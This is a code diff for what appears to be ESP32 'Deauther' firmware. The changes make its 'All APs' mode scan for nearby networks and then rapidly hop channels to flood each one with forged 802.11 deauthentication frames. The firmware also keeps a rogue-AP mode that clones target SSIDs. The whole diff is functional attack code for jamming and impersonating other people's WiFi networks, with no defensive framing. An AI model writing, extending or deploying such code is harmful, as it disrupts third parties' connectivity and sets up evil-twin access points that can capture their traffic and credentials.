@@ -54,37 +54,55 @@ bool Deauther::start(const WifiNetworkInfo& targetNetwork) {
 bool Deauther::startAllAPs() {
     if (isActive_ || !isAttackPending_) return false;
 
-    allTargets_ = app_->getWifiManager().getScannedNetworks();
-    if (allTargets_.empty()) {
-        isAttackPending_ = false;
-        return false;
-    }
-
-    currentTargetIndex_ = -1;
-    hopToNextTarget();
+    // We must scan for fresh targets right before the attack starts.
+    app_->getWifiManager().startScan();
+    // A short delay to allow the scan to initiate. The loop will handle completion.
+    delay(200); 
 
     isActive_ = true;
-    isAttackPending_ = false;
+    isAttackPending_ = false; // The attack process has started, even if we are waiting for scan results
     return true;
 }
 
 void Deauther::stop() {
-    if (!isActive_) return;
+    if (!isActive_ && !isAttackPending_) return;
     
     Serial.println("[DEAUTHER] Stopping attack.");
     isActive_ = false;
     isAttackPending_ = false;
-    rfLock_.reset(); // This releases the hardware lock, which in turn calls WiFi.mode(WIFI_OFF), etc.
+    rfLock_.reset(); 
     allTargets_.clear();
     currentTargetIndex_ = -1;
     currentTargetSsid_ = "";
     app_->getHardwareManager().setPerformanceMode(false);
+    
+    // Explicitly turn off WiFi to be safe
+    WiFi.mode(WIFI_OFF);
 }
 
 void Deauther::loop() {
     if (!isActive_) return;
 
-    if (currentConfig_.target == DeauthTarget::ALL_APS) {
+    // --- NEW: Handle initial scan for "All APs" attack ---
+    if (currentConfig_.target == DeauthTarget::ALL_APS && allTargets_.empty()) {
+        if (WiFi.scanComplete() > 0) {
+            allTargets_ = app_->getWifiManager().getScannedNetworks();
+            if (allTargets_.empty()) {
+                // If scan finished but no networks found, stop the attack.
+                app_->showPopUp("Error", "No networks found.", nullptr, "OK", "", true);
+                app_->returnToMenu(MenuType::DEAUTH_TOOLS_GRID);
+                return;
+            }
+            // Scan is complete, start the first hop.
+            currentTargetIndex_ = -1;
+            hopToNextTarget();
+        }
+        // If scan is not complete, we just wait. The "Starting..." screen will show.
+        return;
+    }
+
+    // --- Main attack logic ---
+    if (currentConfig_.target == DeauthTarget::ALL_APS && currentConfig_.mode == DeauthMode::ROGUE_AP) {
         if (millis() - lastHopTime_ > ALL_APS_HOP_INTERVAL_MS) {
             hopToNextTarget();
         }
@@ -104,7 +122,6 @@ void Deauther::hopToNextTarget() {
         return;
     }
     
-    // Release the previous lock before acquiring a new one.
     if (rfLock_) {
         rfLock_.reset();
     }
@@ -132,21 +149,34 @@ void Deauther::executeAttackForCurrentTarget() {
         WiFi.softAP(newTarget.ssid, "dummypassword", newTarget.channel);
 
     } else if (currentConfig_.mode == DeauthMode::BROADCAST) {
-        rfLock_ = app_->getHardwareManager().requestRfControl(RfClient::WIFI_PROMISCUOUS);
+        // For broadcast, we only need to set up the hardware once.
         if (!rfLock_ || !rfLock_->isValid()) {
-            Serial.printf("[DEAUTHER] Failed to acquire WIFI_PROMISCUOUS lock for %s.\n", newTarget.ssid);
-            return;
+            rfLock_ = app_->getHardwareManager().requestRfControl(RfClient::WIFI_PROMISCUOUS);
+             if (!rfLock_ || !rfLock_->isValid()) {
+                Serial.printf("[DEAUTHER] Failed to acquire WIFI_PROMISCUOUS lock for %s.\n", newTarget.ssid);
+                return;
+            }
         }
-        Serial.printf("[DEAUTHER] Starting Broadcast Deauth for %s on channel %d\n", newTarget.ssid, newTarget.channel);
-        esp_wifi_set_channel(newTarget.channel, WIFI_SECOND_CHAN_NONE);
-        // The loop() will now handle sending the packets.
+        // The channel hopping and packet sending is handled in the broadcast loop.
     }
 }
 
 void Deauther::sendBroadcastDeauthPacket() {
-    if (currentTargetIndex_ < 0 || currentTargetIndex_ >= allTargets_.size()) return;
+    if (allTargets_.empty()) return;
+
+    // --- MODIFIED BROADCAST LOGIC ---
+    // Instead of just attacking one target, we cycle through all targets rapidly.
     
+    // Increment index for next packet
+    currentTargetIndex_ = (currentTargetIndex_ + 1) % allTargets_.size();
     const WifiNetworkInfo& currentTarget = allTargets_[currentTargetIndex_];
+    
+    // Hop to the channel of the *next* target. This is the core of the simultaneous attack.
+    esp_wifi_set_channel(currentTarget.channel, WIFI_SECOND_CHAN_NONE);
+    
+    // Update the UI with the target we are currently sending a packet for.
+    currentTargetSsid_ = currentTarget.ssid;
+
     uint8_t deauth_packet[sizeof(deauth_frame_template)];
     memcpy(deauth_packet, deauth_frame_template, sizeof(deauth_frame_template));
     
@@ -155,6 +185,7 @@ void Deauther::sendBroadcastDeauthPacket() {
     
     esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
 }
+
 
 bool Deauther::isActive() const { return isActive_; }
 bool Deauther::isAttackPending() const { return isAttackPending_; }
